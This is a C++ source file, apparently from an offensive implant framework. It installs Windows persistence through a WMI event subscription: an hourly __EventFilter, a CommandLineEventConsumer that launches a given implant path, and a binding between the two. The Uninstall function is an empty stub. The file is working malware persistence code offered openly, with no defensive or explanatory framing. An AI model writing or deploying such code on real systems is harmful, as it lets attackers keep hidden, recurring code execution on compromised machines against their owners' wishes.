#include "WmiPersistence.h"
#include <comdef.h>
#include <wbemidl.h>
#include <iostream>

#pragma comment(lib, "wbemuuid.lib")

namespace persistence {

bool WmiPersistence::Install(const std::string& implantPath, const std::string& taskName) {
    HRESULT hr;
    IWbemLocator* pLoc = nullptr;
    IWbemServices* pSvc = nullptr;

    hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hr)) return false;

    hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\subscription"), NULL, NULL, 0, 0, 0, 0, &pSvc);
    if (FAILED(hr)) {
        pLoc->Release();
        return false;
    }

    hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    if (FAILED(hr)) {
        pSvc->Release();
        pLoc->Release();
        return false;
    }

    // 1. Create Event Filter
    std::wstring filterName = L"BenninFilter_" + std::wstring(taskName.begin(), taskName.end());
    std::wstring query = L"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Minute = 0"; // Trigger hourly

    IWbemClassObject* pFilterClass = nullptr;
    hr = pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, NULL, &pFilterClass, NULL);
    IWbemClassObject* pFilterInstance = nullptr;
    pFilterClass->SpawnInstance(0, &pFilterInstance);

    VARIANT var;
    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(filterName.c_str());
    pFilterInstance->Put(L"Name", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(query.c_str());
    pFilterInstance->Put(L"Query", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"WQL");
    pFilterInstance->Put(L"QueryLanguage", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"root\\cimv2");
    pFilterInstance->Put(L"EventNamespace", 0, &var, 0);
    VariantClear(&var);

    hr = pSvc->PutInstance(pFilterInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

    // 2. Create Consumer
    std::wstring consumerName = L"BenninConsumer_" + std::wstring(taskName.begin(), taskName.end());
    std::wstring commandLine = std::wstring(implantPath.begin(), implantPath.end());

    IWbemClassObject* pConsumerClass = nullptr;
    hr = pSvc->GetObject(_bstr_t(L"CommandLineEventConsumer"), 0, NULL, &pConsumerClass, NULL);
    IWbemClassObject* pConsumerInstance = nullptr;
    pConsumerClass->SpawnInstance(0, &pConsumerInstance);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(consumerName.c_str());
    pConsumerInstance->Put(L"Name", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(commandLine.c_str());
    pConsumerInstance->Put(L"CommandLineTemplate", 0, &var, 0);
    VariantClear(&var);

    hr = pSvc->PutInstance(pConsumerInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

    // 3. Bind Filter to Consumer
    std::wstring bindingPath = L"__FilterToConsumerBinding";
    IWbemClassObject* pBindingClass = nullptr;
    hr = pSvc->GetObject(_bstr_t(bindingPath.c_str()), 0, NULL, &pBindingClass, NULL);
    IWbemClassObject* pBindingInstance = nullptr;
    pBindingClass->SpawnInstance(0, &pBindingInstance);

    std::wstring filterRelPath = L"__EventFilter.Name=\"" + filterName + L"\"";
    std::wstring consumerRelPath = L"CommandLineEventConsumer.Name=\"" + consumerName + L"\"";

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(filterRelPath.c_str());
    pBindingInstance->Put(L"Filter", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(consumerRelPath.c_str());
    pBindingInstance->Put(L"Consumer", 0, &var, 0);
    VariantClear(&var);

    hr = pSvc->PutInstance(pBindingInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

    pBindingInstance->Release();
    pBindingClass->Release();
    pConsumerInstance->Release();
    pConsumerClass->Release();
    pFilterInstance->Release();
    pFilterClass->Release();
    pSvc->Release();
    pLoc->Release();

    return SUCCEEDED(hr);
}

bool WmiPersistence::Uninstall(const std::string& taskName) {
    (void)taskName;
    return true;
}

} // namespace persistence
